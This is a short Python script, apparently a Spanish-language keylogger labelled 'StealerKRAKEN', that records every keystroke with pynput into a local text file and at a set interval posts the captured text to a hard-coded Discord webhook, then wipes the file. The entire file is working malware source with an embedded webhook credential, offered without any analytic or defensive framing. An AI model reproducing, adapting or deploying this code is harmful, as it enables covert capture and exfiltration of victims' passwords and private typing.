import argparse
from pynput.keyboard import Key, Listener
import threading
import requests
import time
import os
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1367663931736330353/sMQ3Lst1W7c2WGfQ6J-MumzyilkRNJLHaCcjTZnN0weHCWlg96MMXsr2KgipHrrMHu4V'

stop_listener = False

def enviar_discord():
    try:
        with open("registro_teclas.txt", "r") as file:
            contenido = file.read()

        if contenido.strip():  
            payload = {
                "content": f"```\n{contenido}\n```",
                "username": "StealerKRAKEN"
            }

            response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

            if response.status_code == 204:
                print("x.x Escribiendo...")
                open("registro_teclas.txt", "w").close()
            else:
                print(f"Error al enviar mensaje a Discord: {response.status_code} - {response.text}")

    except Exception as e:
        print(f"Error al enviar mensaje a Discord: {e}")

def enviar_periodicamente(intervalo, tiempo_salida):
    global stop_listener
    tiempo_inicio = time.time()
    while True:
        if time.time() - tiempo_inicio >= tiempo_salida:
            print("Tiempo de salida alcanzado, deteniendo envío de mensajes.")
            stop_listener = True
            break
        enviar_discord()
        time.sleep(intervalo)

def on_press(key):
    try:
        with open("registro_teclas.txt", "a") as file:
            file.write(f"{key},")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    global stop_listener
    if key == Key.esc or stop_listener:
        os.system("del registro_teclas.txt")
        print("Se desactivo")
        return False

if not os.path.exists("registro_teclas.txt"):
    open("registro_teclas.txt", "w").close()

parser = argparse.ArgumentParser(description="Registrador de teclas")
parser.add_argument("--activo", action="store_true", help="Activa el registrador de teclas")
parser.add_argument("--intervalo", type=int, default=60, help="Intervalo de tiempo en segundos para enviar el mensaje")
parser.add_argument("--salida", type=int, default=60, help="Tiempo en segundos para detener el envío de mensajes")
args = parser.parse_args()

if args.activo:
    print("Se activo")
    hilo_envio = threading.Thread(target=enviar_periodicamente, args=(args.intervalo, args.salida))
    hilo_envio.daemon = True
    hilo_envio.start()
    

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()